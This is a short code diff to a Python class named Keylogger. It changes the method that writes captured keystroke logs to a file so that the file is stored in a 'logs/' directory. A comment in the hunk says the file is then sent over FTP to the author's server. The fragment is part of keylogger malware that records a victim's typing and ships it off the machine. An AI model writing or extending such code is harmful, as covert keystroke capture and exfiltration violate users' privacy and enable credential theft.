@@ -46,7 +46,7 @@ class Keylogger:
     def report_to_file(self):
         # include end time in file name
         self.end_dt = datetime.now().strftime('%H:%M:%S %m/%d/%Y')
-        filename = self.start_dt + " to " + self.end_dt
+        filename = "logs/"+ self.start_dt + " to " + self.end_dt
         with open(filename, "wb") as file:
             file.write(self.log)
         # send the file over ftp to our server
